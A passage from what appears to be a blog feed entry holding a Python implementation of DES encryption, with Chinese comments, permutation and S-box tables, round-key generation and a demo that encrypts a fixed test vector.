		[ 1, 4, 11, 13, 12, 3, 7, 14, 10, 15, 6, 8, 0, 5, 9, 2 ],
		[ 6, 11, 13, 8, 1, 4, 10, 7, 9, 5, 0, 15, 14, 2, 3, 12 ] ]
 
s8 = [
		[ 13, 2, 8, 4, 6, 15, 11, 1, 10, 9, 3, 14, 5, 0, 12, 7 ],
		[ 1, 15, 13, 8, 10, 3, 7, 4, 12, 5, 6, 11, 0, 14, 9, 2 ],
		[ 7, 11, 4, 1, 9, 12, 14, 2, 0, 6, 10, 13, 15, 3, 5, 8 ],
		[ 2, 1, 14, 7, 4, 10, 8, 13, 15, 12, 9, 0, 3, 5, 6, 11 ] ]

# p置换表
p=[16, 7, 20, 21, 29, 12, 28, 17, 1, 15, 23, 26, 5, 18, 31, 10,2, 8, 24, 14, 32, 27, 3, 9, 19, 13, 30, 6, 22, 11, 4, 25] 

#压缩密钥到56位
cre_56key=[57,49,41,33,25,17,9,1, 
58,50,42,34,26,18,10,2,
59,51,43,35,27,19,11,3,
60,52,44,36,63,55,47,39,
31,23,15,7,62,54,46,38,
30,22,14,6,61,53,45,37,
29,21,13,5,28,20,12,4]

#压缩密钥到48位
cre_48key=[14,17,11,24,1,5,3,28, 
15,6,21,10,23,19,12,4,
26,8,16,7,27,20,13,2,
41,52,31,37,47,55,30,40,
51,45,33,48,44,49,39,56,
34,53,46,42,50,36,29,32]

#左移动次数
mobile_n=[1,1,2,2,2,2,2,2,1,2,2,2,2,2,2,1] 

#轮密钥
keys=[]

#E扩展矩阵
E= [32, 1, 2, 3, 4, 5,
4, 5, 6, 7, 8, 9,
8, 9, 10, 11, 12, 13,
12, 13, 14, 15, 16, 17,
16, 17, 18, 19, 20, 21,
20, 21, 22, 23, 24, 25,
24, 25, 26, 27, 28, 29,
28, 29, 30, 31, 32, 1]

#ip置换
def ip_replace(tem_data):
    c=[]
    for i in ip:
        c.append(tem_data[i-1])
    return c

#E/P扩展
def Extension(r0):
    r1=[]
    for i in E:
        r1.append(str(r0[i-1]))
    return r1

#轮密钥生成
def cre_keys(secret_key):
    temp=[]
    for i in cre_56key:
        temp.append(secret_key[i-1])
    c0=cre_56key[0:28]
    d0=cre_56key[28:]
    L0=[]
    R0=[]
    for i in c0:
        L0.append(secret_key[i-1])
    for i in d0:
        R0.append(secret_key[i-1])
    for i in range(16):
        L0=L0[mobile_n[i]:]+L0[0:mobile_n[i]]
        R0=R0[mobile_n[i]:]+R0[0:mobile_n[i]]
        temp_k=L0+R0
        
        key1=[]
        for i in cre_48key:
            key1.append(str(temp_k[i-1]))
        keys.append(&quot;&quot;.join(key1))

#S盒替换
def s_replace(r1):
    s_box=['s1[r][c]','s2[r][c]','s3[r][c]','s4[r][c]','s5[r][c]','s6[r][c]','s7[r][c]','s8[r][c]']
    s_dates=&quot;&quot;
    for i in range(8):
        if i!=7:
            s_data=r1[i*6:(i+1)*6]
        else:
            s_data=r1[i*6:]
        r=int(s_data[0]+s_data[-1],2)
        c=int(s_data[1:-1],2)
        
        s_da=bin(eval(s_box[i]))[2:]
        
        patter=4-len(s_da)
        s_da='0'*patter+s_da
        s_dates+=s_da
    return s_dates

#P置换
def P_replace(l0,s_dates,old_r0):
    temp_r=''
    temp_l=''
    temp=''
    for i in p:
        temp_r+=s_dates[i-1]
    for i in l0:
        temp_l+=str(i)
    temp=bin(int(temp_l,2)^int(temp_r,2))[2:]
    while len(temp)&lt;32:
        temp='0'+temp
    r1=[]
    l1=old_r0
    for i in temp:
        r1.append(int(i))
    temp_data=l1+r1
    return temp_data

#ip逆置换
def _ip_replace(temp_data):
    data=temp_data[32:]+temp_data[0:32]
    cipher=[]
    for i in ip_:
        cipher.append(data[i-1])
    return cipher

if __name__ == &quot;__main__&quot;:
    #data=input('输入data:')
    #secret_key=input('输入密钥:')
    data='1001100001110110010101000011001000010001010001110010010110000011'
    secret_key='0001001000110100010101100111100010010001001000110100010101100111'
    tem_data=[]
    cre_keys(secret_key)
    for i in range(len(data)):
        if i==&quot; &quot;:
            continue
        tem_data.append(int(data[i]))
    c=ip_replace(tem_data)
    for i in range(16):
        l0=c[0:32]
        r0=c[32:]
        r1=Extension(r0)
        r1=&quot;&quot;.join(r1)
        tmp=&quot;&quot;
        tmp+=bin(int(r1,2)^int(keys[i],2))[2:]
        while len(tmp)&lt;48:
            tmp='0'+tmp
        s_dates=s_replace(tmp)
        
        c=P_replace(l0,s_dates,r0)
    cipher=_ip_replace(c)
    secret=''
    for i in cipher:
        secret+=str(i)
    print('DES加密结果:',secret)
    print('DES加密结果:',hex(int(secret,2)))
</code></pre>
]]></content>
    </entry>
</feed>